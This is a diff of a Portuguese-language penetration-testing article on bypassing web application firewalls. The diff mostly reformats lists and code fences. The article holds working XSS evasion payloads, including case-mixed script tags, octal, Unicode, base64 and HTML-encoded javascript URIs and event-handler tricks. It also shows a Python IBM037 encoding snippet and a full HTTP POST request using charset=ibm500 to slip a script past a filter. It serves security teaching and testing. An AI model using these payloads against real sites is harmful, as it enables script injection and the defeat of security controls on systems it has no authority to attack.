@@ -24,13 +24,13 @@ Agora vamos explorar algumas técnicas comuns de bypass do WAF juntamente com ex
 
 1. **Ignorando o Regex**: Este método se aplica à filtragem baseada em regex feita pelo WAF e pelo servidor web. Durante um teste de penetração de caixa preta, pode ser difícil descobrir a expressão regular exata utilizada pelo WAF. No entanto, se a expressão regular for conhecida, é possível contorná-la usando algumas técnicas. Aqui estão alguns exemplos:
 
-   - Alteração do caso da carga útil
-   - Uso de várias codificações
-   - Substituição de funções ou caracteres
-   - Uso de sintaxe alternativa
-   - Uso de quebras de linha ou tabulações
+- Alteração do caso da carga útil
+- Uso de várias codificações
+- Substituição de funções ou caracteres
+- Uso de sintaxe alternativa
+- Uso de quebras de linha ou tabulações
 
-   Os exemplos abaixo demonstram algumas abordagens para contornar o regex com comentários.
+Os exemplos abaixo demonstram algumas abordagens para contornar o regex com comentários.
 ```
 <sCrIpT>alert(XSS)</sCriPt> #alterando o caso da tag
 << script>alert(XSS)</script > #prependendo um "<"
@@ -47,16 +47,16 @@ java%0ascript:alert(1) #usando caracteres de nova linha codificados
 
 2. **Ofuscação**: Embora a ofuscação seja uma maneira possível de ignorar o regex, eles foram divididos em diferentes seções para mostrar mais exclusivamente uma seleção de técnicas de ofuscação. A ofuscação é uma técnica utilizada para tornar o código malicioso mais difícil de ser detectado pelo WAF. Aqui estão alguns exemplos de técnicas de ofuscação:
 
-   - Uso de funções incomuns além de alert, console.log e prompt
-   - Codificação octal
-   - Codificação Unicode
-   - Uso de comentários para quebrar instruções SQL
-   - Uso de acentos graves ao invés de parênteses
-   - Codificação Base64 do JavaScript
-   - Codificação HTML
+- Uso de funções incomuns além de alert, console.log e prompt
+- Codificação octal
+- Codificação Unicode
+- Uso de comentários para quebrar instruções SQL
+- Uso de acentos graves ao invés de parênteses
+- Codificação Base64 do JavaScript
+- Codificação HTML
 
-   Essas técnicas podem ajudar a contornar a detecção do WAF. Exemplos abaixo:
-```
+Essas técnicas podem ajudar a contornar a detecção do WAF. Exemplos abaixo:
+~~~
 Function( "ale" + "rt(1)" )(); #usando funções incomuns além de alert, console.log e prompt
 javascript:74163166147401571561541571411447514115414516216450615176 #codificação octal
 <iframe src= "javascript:alert(`xss`)" > #codificação unicode
@@ -66,7 +66,7 @@ data:text/html; base64 ,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 codificando o javas
 %26%2397;lert(1) #usando codificação HTML
 <a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)" > #Using Line Feed (LF) line breaks
 <BODY onload! #$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use quaisquer caracteres que não sejam letras, números ou caracteres de encapsulamento entre o manipulador de eventos e o sinal de igual (só funciona no motor Gecko)
-```
+~~~
 
 
 
@@ -78,25 +78,25 @@ data:text/html; base64 ,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 codificando o javas
 
 5. **Conjunto de caracteres**: Essa técnica envolve a modificação do cabeçalho Content-Type para usar um conjunto de caracteres diferente, como por exemplo "ibm500". Um WAF que não está configurado para detectar cargas maliciosas em diferentes codificações pode não reconhecer a solicitação como maliciosa. A codificação do conjunto de caracteres pode ser feita em Python da seguinte maneira:
 
-```
+~~~python
 $ python3
 -- snip --
 >>> import urllib.parse
 >>> s = '<script>alert("xss")</script>'
 >>> urllib.parse.quote_plus(s.encode("IBM037"))
 'L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n'
-```
+~~~
 
 A string codificada pode então ser enviada no corpo da solicitação e carregada no servidor, como exemplificado abaixo:
 
-```
+~~~
 POST /comment/post HTTP/1.1
 Host: chatapp
 Content-Type: application/x-www-form-urlencoded; charset=ibm500
 Content-Length: 74
 
 %A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3
-```
+~~~
 
 Essa técnica permite que a solicitação seja processada pelo servidor, contornando as verificações do WAF que não estão configuradas para detectar essa codificação específica.
 
